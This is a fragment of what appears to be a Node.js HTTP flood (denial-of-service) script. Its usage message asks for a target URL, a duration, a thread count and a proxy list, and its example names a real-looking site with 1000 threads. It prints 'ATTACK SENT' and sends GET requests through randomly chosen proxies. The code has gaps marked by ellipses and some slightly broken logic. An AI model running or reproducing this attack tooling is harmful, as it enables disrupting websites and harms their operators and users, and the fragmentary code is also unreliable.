...
async function poptto() {
    if (process.argv.length !== 6) {
        console.log(`node Script.js url times threads proxy/off/proxy.txt`);
        console.log(`vi du : node Script.js https://dangtri.com 120 1000 dmtproxy.txt`);
        process.exit(0);
    }else{
        ...
        if (process.argv[5] == 'off') {
            ...
            console.log("ATTACK SENT !SCRIPT")
            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
        }
        function run() {
            if (process.argv[5] !== 'off') {
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({'ATTACK SENT ! DMT-SCRIPT': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
